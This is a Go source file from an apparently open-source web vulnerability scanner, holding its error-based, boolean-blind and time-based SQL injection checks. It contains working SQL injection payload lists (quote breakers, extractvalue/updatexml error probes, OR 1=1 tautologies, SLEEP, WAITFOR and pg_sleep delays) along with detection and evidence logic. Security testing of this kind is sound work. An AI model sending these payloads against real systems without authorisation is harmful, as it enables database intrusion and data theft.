// Package active holds the checks that send traffic: they take a parameter, put
// a payload in it, and reason about what came back.
//
// Every check here is built the same way. It establishes what "normal" looks
// like — either from the response the proxy already captured, or by measuring a
// baseline request — then compares each payload's response against that,
// through the normalisation engine, so that timestamps and counters in the page
// do not drown the signal. Evidence is always attached, because a finding a
// reader cannot verify is a finding they will not act on.
package active

import (
	"context"
	"html"
	"strconv"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// init registers every active check.
func init() {
	checks.Register(sqliError{})
	checks.Register(sqliBoolean{})
	checks.Register(sqliTime{})
	checks.Register(sqliUnion{})
	checks.Register(sqliOrderBy{})
	checks.Register(xssStored{})
	checks.Register(xssReflected{})
	checks.Register(pathTraversal{})
	checks.Register(ssti{})
	checks.Register(openRedirect{})
	checks.Register(crlfInjection{})
	checks.Register(nosqli{})
	checks.Register(ssrf{})
	checks.Register(accessControl{})
	checks.Register(accessControlVariants{})
	checks.Register(paginationBypass{})
	checks.Register(parameterTypeBypass{})
	checks.Register(ldapInjection{})
	checks.Register(xpathInjection{})
	checks.Register(odataInjection{})
	checks.Register(graphqlIntrospection{})
	checks.Register(cachePoisoning{})
	checks.Register(domXSS{})
	checks.Register(xxe{})
	checks.Register(jwt{})
	checks.Register(csrf{})
	checks.Register(hostHeader{})
	checks.Register(unsafeUpload{})
	checks.Register(deserialization{})
	checks.Register(secondOrder{})
	checks.Register(methodOverride{})
	checks.Register(requestSmuggling{})
	checks.Register(commandInjection{})
}

// sqlErrorSignatures are the fragments database drivers put in an error
// message. They are specific enough that seeing one where the baseline had none
// is conclusive.
var sqlErrorSignatures = []string{
	"you have an error in your sql syntax",
	"sql syntax",
	"mysql_fetch",
	"mysqli_",
	"warning: mysql",
	"mysql server version",
	"unclosed quotation mark",
	"quoted string not properly terminated",
	"odbc sql server driver",
	"microsoft ole db provider",
	"sqlstate[",
	"postgresql query failed",
	"pg_query()",
	"pg::syntaxerror",
	"sqlite3.operationalerror",
	"sqlite error",
	// A driver often reports its exception class rather than the module path, and the
	// exception names are the same across the DB-API: bare `OperationalError` is what a
	// SQLite or PostgreSQL driver prints, and matching only the dotted spelling misses it.
	"operationalerror",
	"programmingerror",
	"integrityerror",
	"unrecognized token",
	"psycopg2",
	"sqlalchemy.exc",
	"ora-0",
	"oracle error",
	"invalid query",
	"jdbc",
}

// sqlErrorSeeds break the syntax of whatever statement the parameter is
// embedded in, one per plausible quoting context.
//
// These are seeds, not the payload list: the mutation engine derives the
// variations that survive a filter, so a small set of clearly-correct
// expressions is worth more here than a long list of near-duplicates.
var sqlErrorSeeds = []string{
	"'",
	"\"",
	"\\",
	"'-- -",
	"')-- -",
	"'||'",
	"1' AND 1=CONVERT(int, @@version)-- -",
	"1 AND 1=CONVERT(int, @@version)",
	"' AND extractvalue(1,concat(0x7e,version()))-- -",
	"' AND updatexml(1,concat(0x7e,user()),1)-- -",
	"';SELECT 1/0-- -",

	// ORDER BY and LIMIT take an expression but not a quoted string, and no
	// amount of quoting will help — so a parameter that reaches one of them is
	// invisible to every seed above. These append another term to whatever the
	// caller already supplied, which is the only way in: the position accepts a
	// comma-separated list.
	",(select 1)",
	"1,(select 1)",
	"1 ASC,(select 1)",
	" desc,(select 1)",
	",1/0",
	",(select 1/0)",
	" PROCEDURE ANALYSE(1,1)",
}

// sqliError detects error-based SQL injection.
type sqliError struct{}

func (sqliError) ID() string                 { return "sqli-error" }
func (sqliError) TitleKey() i18n.Key         { return i18n.KeyCheckSQLiErrorTitle }
func (sqliError) DescriptionKey() i18n.Key   { return i18n.KeyCheckSQLiErrorDesc }
func (sqliError) RemediationKey() i18n.Key   { return i18n.KeyCheckSQLiErrorFix }
func (sqliError) Severity() finding.Severity { return finding.SeverityCritical }
func (sqliError) Tags() []string {
	return []string{"active", "injection", "sqli", "owasp-top10"}
}
func (sqliError) Passive() bool { return false }

func (sqliError) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	baseline := strings.ToLower(string(t.Response.Body))

	// Establish whether a firewall is in the way before spending payloads on
	// it. This is a no-op after the first call for a given host.
	c.ProbeWAF(ctx, t)

	attempt, err := c.SendVariants(ctx, t, payload.SQLi, "sqli-error", sqlErrorSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			return firstNewSignature(strings.ToLower(string(resp.Body)), baseline, sqlErrorSignatures) != ""
		})
	if err != nil || attempt == nil {
		return nil
	}

	hit := firstNewSignature(strings.ToLower(string(attempt.Response.Body)), baseline, sqlErrorSignatures)

	f := checks.NewFinding(sqliError{}, t,
		i18n.KeyCheckSQLiErrorTitle, i18n.KeyCheckSQLiErrorDesc, i18n.KeyCheckSQLiErrorFix)
	f.Severity = finding.SeverityCritical
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-89"
	f.References = sqlReferences
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{hit, variantNote(c, attempt)}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), hit, 200)
	return []*finding.Finding{f}
}

// variantNote explains how the payload got through, so a reader can tell a plain
// hit from one that had to defeat a filter — and, when it did, which trick
// worked.
func variantNote(c *checks.Context, attempt *checks.Attempt) string {
	if attempt == nil {
		return ""
	}
	note := c.Bundle.T(i18n.KeyEvidenceVariant,
		attempt.Variant.Label(), attempt.Variant.Generation, strings.Join(attempt.Variant.Mutators, ", "))
	if attempt.Polluted {
		note += ". " + c.Bundle.T(i18n.KeyEvidenceHPP)
	}
	return note
}

// sqlReferences are the standard write-ups for SQL injection.
var sqlReferences = []string{
	"https://owasp.org/www-community/attacks/SQL_Injection",
	"https://cwe.mitre.org/data/definitions/89.html",
}

// sqliBoolean detects boolean-based blind SQL injection by sending a condition
// that is always true and one that is always false, and checking that the page
// tracks the difference.
type sqliBoolean struct{}

func (sqliBoolean) ID() string                 { return "sqli-boolean" }
func (sqliBoolean) TitleKey() i18n.Key         { return i18n.KeyCheckSQLiBoolTitle }
func (sqliBoolean) DescriptionKey() i18n.Key   { return i18n.KeyCheckSQLiBoolDesc }
func (sqliBoolean) RemediationKey() i18n.Key   { return i18n.KeyCheckSQLiBoolFix }
func (sqliBoolean) Severity() finding.Severity { return finding.SeverityHigh }
func (sqliBoolean) Tags() []string {
	return []string{"active", "injection", "sqli", "blind", "owasp-top10"}
}
func (sqliBoolean) Passive() bool { return false }

// booleanSuffixes are the two shapes a condition can take, and both are needed.
//
// AND hinges on the submitted value matching a row: `code='WELCOME10' AND '1'='1`
// returns the row, and the same with `='2` returns nothing. That is the cleanest
// signal, but it only exists when the parameter's current value is one the query
// would have matched — and a scanner has no way to know that. Sending `AND`
// against a value that matches nothing makes both branches equally empty, which
// looks exactly like a target without the bug. This is not hypothetical: it is
// what happened the first time this check was run against a real target, where
// the parameter held an arbitrary string and the true branch was as dead as the
// false one.
//
// OR does not depend on that. `code='anything' OR '1'='1` is true whatever the
// stored data is, and the `='2` form is false whenever the value matches no row,
// so the two branches differ either way. The trade is that the true branch
// widens the result set rather than reproducing the baseline, which is why the
// judgement knows which shape it is looking at.
//
// The rest cover quoting contexts the first two cannot: an unquoted numeric
// column, a doubled quote, a closed parenthesis.
// booleanFamilies are groups of conditions that SQL must treat identically.
//
// This is the whole point of the check, and it is a property of the query
// language rather than of any particular target. SQL evaluates a condition for
// its truth value: `'1'='1` and `'2'='2` are the same thing to a database, and
// so are `'1'='2` and `'3'='4`. Every true condition must therefore produce the
// same page as every other true condition, and every false one the same as every
// other false one.
//
// That equivalence is what separates a boolean channel from a page that merely
// changes. A template expression, a sort key or a filter does not evaluate truth
// values — it processes a string — so four payloads that differ only in their
// literals produce four different results, and the family fails its own
// consistency test. The check never has to know what the parameter is for.
//
// It also subsumes reproducibility: a page that varies on its own will not
// return the same thing for two true conditions either, so unstable targets drop
// out without a separate round of repeat requests.
var booleanFamilies = []struct {
	name        string
	trueValues  []string
	falseValues []string
	// anchored marks a family whose true branch is expected to reproduce the
	// baseline. Only the AND forms are, because only they narrow the result set
	// back to what the original query returned.
	anchored bool
}{
	{
		name:        "AND",
		trueValues:  []string{"' AND '1'='1", "' AND '2'='2"},
		falseValues: []string{"' AND '1'='2", "' AND '3'='4"},
		anchored:    true,
	},
	{
		name:        "AND, numeric",
		trueValues:  []string{" AND 1=1", " AND 2=2"},
		falseValues: []string{" AND 1=2", " AND 3=4"},
		anchored:    true,
	},
	{
		name:        "AND, closed parenthesis",
		trueValues:  []string{") AND (1=1", ") AND (2=2"},
		falseValues: []string{") AND (1=2", ") AND (3=4"},
		anchored:    true,
	},
	{
		name:        "OR",
		trueValues:  []string{"' OR '1'='1'-- -", "' OR '2'='2'-- -"},
		falseValues: []string{"' OR '1'='2'-- -", "' OR '3'='4'-- -"},
	},
	{
		name:        "OR, numeric",
		trueValues:  []string{"' OR 1=1-- -", "' OR 2=2-- -"},
		falseValues: []string{"' OR 1=2-- -", "' OR 3=4-- -"},
	},
	{
		name:        "OR, double quotes",
		trueValues:  []string{`" OR "1"="1"-- -`, `" OR "2"="2"-- -`},
		falseValues: []string{`" OR "1"="2"-- -`, `" OR "3"="4"-- -`},
	},
}

// echoRestore builds the pattern/replacement list that puts a reflected payload
// back the way the baseline had it.
//
// A page that prints the parameter back does not print it literally: templates
// escape it first, so `1' OR '1'='1` comes back as `1&#39; OR &#39;1&#39;=&#39;1`. A restore
// list holding only the raw text matches nothing, the reflection stays in the
// fingerprint, and the branch then looks different from the baseline for a
// reason that has nothing to do with the query — which is exactly how a
// confirmation check turns into a source of false findings. Both spellings are
// therefore offered.
//
// The list has to be applied to *both* sides of a comparison, and that is the
// part that is easy to get wrong: a replacement also matches page text the
// application wrote for its own reasons — `1"` inside `size="1"`, `submit"`
// inside `type="submit"` — so a restore applied to the probe alone shortens the
// probe, leaves the baseline as it was, and manufactures a difference that is
// not there. Every caller fingerprints the baseline with the same list, per
// value; baseUnder in the boolean checks and in sqli_order_by is that symmetry.
func echoRestore(sent, original string) []string {
	pairs := []string{sent, original}
	escapedSent := html.EscapeString(sent)
	escapedOriginal := html.EscapeString(original)
	if escapedSent != sent {
		pairs = append(pairs, escapedSent, escapedOriginal)
	}
	return pairs
}

// booleanBranch is one probe: the value sent and what came back.
type booleanBranch struct {
	value    string
	response *httpmsg.Response
	fp       *diff.Fingerprint
}

// Run tests whether the parameter feeds a condition into a query, by asking
// whether SQL's notion of equivalence shows up in the responses.
//
// Four probes make up a family: two conditions that are true and two that are
// false, spelled differently from each other. A database evaluates all of the
// true ones identically and all of the false ones identically, so a real channel
// produces exactly two distinct pages — one per truth value. Anything else means
// the differences came from the payload text rather than from the query, which
// is what a template expression, a sort key or an output filter does with a
// string it was handed.
//
// This is why the check needs no knowledge of the parameter's role. It is
// testing a property of SQL, not a property of the application.
func (sqliBoolean) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}

	base := c.BaselineFingerprint(t)
	if base == nil || base.NormLen == 0 {
		return nil
	}

	// The submitted value is carried through rather than replaced. A fixed
	// prefix like `1'` would repoint the query at a row that does not exist, so
	// no condition appended to it could ever be observed — the payload has to
	// extend whatever the parameter already holds.
	prefix := t.Param.Value
	if strings.TrimSpace(prefix) == "" {
		prefix = "1"
	}

	for _, family := range booleanFamilies {
		// baseUnder returns the baseline fingerprinted the way a branch is: with the
		// branch's own restore list. Applying the restore to one side of a comparison
		// only is what turns page text the application wrote for its own reasons into
		// a difference — see echoRestore.
		baseUnder := func(value string) *diff.Fingerprint {
			return c.Fingerprint(t.Response, echoRestore(value, t.Param.Value)...)
		}

		probe := func(suffix string) (booleanBranch, *httpmsg.Request, bool) {
			value := prefix + suffix
			request, response, err := c.Inject(ctx, t, value)
			if err != nil || request == nil || response == nil {
				return booleanBranch{}, nil, false
			}
			// A branch that failed is not a branch that was answered. A payload
			// pasted into a template or a regular expression tends to make the
			// page fail rather than change, and a failure differs from the
			// baseline on every wording; a database answering a condition
			// answers it normally.
			if response.Status >= 400 {
				return booleanBranch{}, nil, false
			}
			// The submitted value is restored to the parameter's original form
			// before fingerprinting, because a page that prints its input back
			// into a form would otherwise differ from the baseline by exactly
			// the payload text — a difference that says nothing about the query.
			fp := c.Fingerprint(response, echoRestore(value, t.Param.Value)...)
			return booleanBranch{value: value, response: response, fp: fp}, request, true
		}

		trueOne, trueReq, ok := probe(family.trueValues[0])
		if !ok {
			continue
		}
		trueTwo, _, ok := probe(family.trueValues[1])
		if !ok {
			continue
		}
		falseOne, _, ok := probe(family.falseValues[0])
		if !ok {
			continue
		}
		falseTwo, _, ok := probe(family.falseValues[1])
		if !ok {
			continue
		}

		// Same truth value, same page. Two differently-spelled true conditions
		// must not disagree, or the difference is not about truth at all — and
		// this is also what rules out a target whose pages simply vary, since
		// such a page cannot agree with itself.
		if trueOne.fp.NormHash != trueTwo.fp.NormHash {
			continue
		}
		if falseOne.fp.NormHash != falseTwo.fp.NormHash {
			continue
		}
		// Different truth value, different page.
		if trueOne.fp.NormHash == falseOne.fp.NormHash {
			continue
		}
		// An AND family also has to leave the original result intact in its true
		// branch — otherwise the change could be the query breaking rather than
		// the condition being honoured.
		if family.anchored && trueOne.fp.NormHash != baseUnder(trueOne.value).NormHash {
			continue
		}

		simTrue := diff.CompareFingerprints(baseUnder(trueOne.value), trueOne.fp).Score
		simFalse := diff.CompareFingerprints(baseUnder(falseOne.value), falseOne.fp).Score
		simBetween := diff.CompareFingerprints(trueOne.fp, falseOne.fp).Score

		f := checks.NewFinding(sqliBoolean{}, t,
			i18n.KeyCheckSQLiBoolTitle, i18n.KeyCheckSQLiBoolDesc, i18n.KeyCheckSQLiBoolFix)
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceFirm
		f.Payload = falseOne.value
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = trueReq.Raw()
		f.Evidence.Response = truncate(falseOne.response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			"true condition: " + trueOne.value,
			"false condition: " + falseOne.value,
			"an equivalent true condition (" + trueTwo.value + ") and an equivalent false one (" +
				falseTwo.value + ") each reproduced its group, so the difference tracks the condition " +
				"rather than the payload",
		}
		f.Evidence.Diff = c.Bundle.T(i18n.KeyEvidenceBoolean,
			round3(simTrue), round3(simFalse), round3(simBetween))
		return []*finding.Finding{f}
	}
	return nil
}

// sqliTimingSuffixes are delay instructions; sqliTimePayloadsFor prefixes them
// with the parameter's own value.
//
// The prefix matters here for a second reason on top of the one in
// booleanSuffixes: a database may evaluate `AND` left to right and stop at the
// first false term, so a payload that makes the original condition fail can
// skip the delay entirely — the scanner would measure a fast response and
// conclude there is no injection when there is.
var sqliTimingSuffixes = []struct {
	suffix string
	delay  time.Duration
}{
	{"' AND SLEEP(5)-- -", 5 * time.Second},
	{"' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -", 5 * time.Second},
	{"; WAITFOR DELAY '0:0:5'--", 5 * time.Second},
	// The same delay without a statement separator. `;` ends the statement, and
	// an application that passes the parameter to a command object — or a filter
	// that blocks the character — never reaches the second statement at all.
	// Here the pause is nested inside the condition instead, which needs no
	// separator and no comment to close the original string.
	{"' AND (SELECT 1)>0 WAITFOR DELAY '0:0:5'--", 5 * time.Second},
	{"' AND 1=(SELECT 1) AND 1=1 WAITFOR DELAY '0:0:5'--", 5 * time.Second},
	{"' AND pg_sleep(5)-- -", 5 * time.Second},
}

// timingBudget is how long a request that is meant to make the server wait is
// given.
//
// Three times the requested delay covers a server that overruns it — which real
// ones do under load — and the flat ten seconds covers the round trip and the
// target's own response time. The alternative, raising the client's deadline,
// would slow down every other request in the scan to serve the handful that
// need it.
func timingBudget(delay time.Duration) time.Duration {
	return delay*3 + 10*time.Second
}

// sqliTimePayloadsFor builds the delay payloads for one parameter value.
func sqliTimePayloadsFor(original string) []struct {
	payload string
	delay   time.Duration
} {
	prefix := original
	if strings.TrimSpace(prefix) == "" {
		prefix = "1"
	}
	out := make([]struct {
		payload string
		delay   time.Duration
	}, 0, len(sqliTimingSuffixes))
	for _, item := range sqliTimingSuffixes {
		out = append(out, struct {
			payload string
			delay   time.Duration
		}{prefix + item.suffix, item.delay})
	}
	return out
}

// sqliTime detects time-based blind SQL injection.
//
// The judgement is statistical rather than a stopwatch reading, because a single
// slow response proves nothing: networks stall, garbage collection pauses,
// neighbours are busy. So a payload that looks promising is sent several times
// and compared against the target measured the same way, and the finding is only
// raised when the delay reproduces and stands clear of the target's own
// variation. See JudgeTiming for the three conditions.
type sqliTime struct{}

func (sqliTime) ID() string                 { return "sqli-time" }
func (sqliTime) TitleKey() i18n.Key         { return i18n.KeyCheckSQLiTimeTitle }
func (sqliTime) DescriptionKey() i18n.Key   { return i18n.KeyCheckSQLiTimeDesc }
func (sqliTime) RemediationKey() i18n.Key   { return i18n.KeyCheckSQLiTimeFix }
func (sqliTime) Severity() finding.Severity { return finding.SeverityHigh }
func (sqliTime) Tags() []string {
	return []string{"active", "injection", "sqli", "blind", "time"}
}
func (sqliTime) Passive() bool { return false }

func (sqliTime) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	c.ProbeWAF(ctx, t)

	for _, candidate := range sqliTimePayloadsFor(t.Param.Value) {
		// Every request in this check is meant to take as long as it asked for,
		// and possibly longer: a server under load overruns its own delay, and
		// the exchange is cut off before the answer arrives if the deadline is
		// the client's ordinary one. That failure is indistinguishable from a
		// target that did not pause, so the finding disappears silently.
		budget := timingBudget(candidate.delay)

		// The mutation engine finds a wording the target's filter lets through;
		// a cheap single-shot comparison decides whether it is worth measuring.
		attempt, err := c.SendVariantsTimed(ctx, t, payload.SQLi, "sqli-time", []string{candidate.payload},
			func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
				// Deliberately permissive: a quarter of the requested pause is
				// enough to justify the requests a real measurement costs. The
				// strict verdict comes next.
				return resp.Duration >= candidate.delay/4
			}, budget)
		if err != nil || attempt == nil {
			continue
		}

		// Measure both sides the same way, then decide.
		encoding := checks.EncodingForVariant(attempt.Variant)
		baseline, err := c.MeasureTimingTimed(ctx, t, t.Param.Value, encoding, checks.DefaultTimingSamples, budget)
		if err != nil {
			continue
		}
		injected, err := c.MeasureTimingTimed(ctx, t, attempt.Variant.Value, encoding, checks.DefaultTimingSamples, budget)
		if err != nil {
			continue
		}
		verdict := checks.JudgeTiming(baseline, injected, candidate.delay)
		if !verdict.Delayed {
			continue
		}

		f := checks.NewFinding(sqliTime{}, t,
			i18n.KeyCheckSQLiTimeTitle, i18n.KeyCheckSQLiTimeDesc, i18n.KeyCheckSQLiTimeFix)
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceFirm
		f.Payload = attempt.Variant.Value
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = attempt.Request.Raw()
		f.Evidence.Response = truncate(attempt.Response.Body, 4096)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Duration = verdict.Injected.Median
		f.Evidence.Matches = []string{
			c.Bundle.T(i18n.KeyEvidenceTimingStat,
				len(injected.Samples), ms(verdict.Injected.Median), ms(baseline.Median),
				ms(verdict.Injected.IQR), variantNote(c, attempt)),
		}
		return []*finding.Finding{f}
	}
	return nil
}

// firstNewSignature returns the first signature present in body but absent from
// baseline, or "" when there is none.
func firstNewSignature(body, baseline string, signatures []string) string {
	return firstNewSignatureNotEchoed(body, baseline, signatures, "")
}

// firstNewSignatureNotEchoed is firstNewSignature with one extra condition: a
// signature that also appears in the payload is not evidence.
//
// This is the difference between a finding and a reflection. Some signatures are
// unavoidably things a payload contains — the NoSQL check looks for `$where`,
// and its payloads contain `$where` — so a target that merely echoes the value
// back would satisfy the naive test. Passing the payload lets the check tell
// "the application complained" apart from "the application repeated me", which
// is the single most common way an injection check fools itself.
func firstNewSignatureNotEchoed(body, baseline string, signatures []string, sent string) string {
	lowerSent := strings.ToLower(sent)
	for _, sig := range signatures {
		if !strings.Contains(body, sig) || strings.Contains(baseline, sig) {
			continue
		}
		if sent != "" && strings.Contains(lowerSent, sig) {
			continue
		}
		return sig
	}
	return ""
}

// extractAround returns a window of text around the first occurrence of needle,
// which is what a reader wants to see as evidence.
func extractAround(haystack, needle string, window int) string {
	lower := strings.ToLower(haystack)
	idx := strings.Index(lower, strings.ToLower(needle))
	if idx < 0 {
		return ""
	}
	start := idx - window/2
	if start < 0 {
		start = 0
	}
	end := idx + len(needle) + window/2
	if end > len(haystack) {
		end = len(haystack)
	}
	return strings.TrimSpace(haystack[start:end])
}

// truncate caps a byte slice for storage in evidence.
func truncate(data []byte, max int) []byte {
	if len(data) <= max {
		return data
	}
	return data[:max]
}

// round3 formats a similarity score for display.
func round3(v float64) string {
	return strconv.FormatFloat(v, 'f', 3, 64)
}

// ms formats a duration in milliseconds.
func ms(d time.Duration) string {
	return strconv.FormatInt(d.Milliseconds(), 10) + "ms"
}
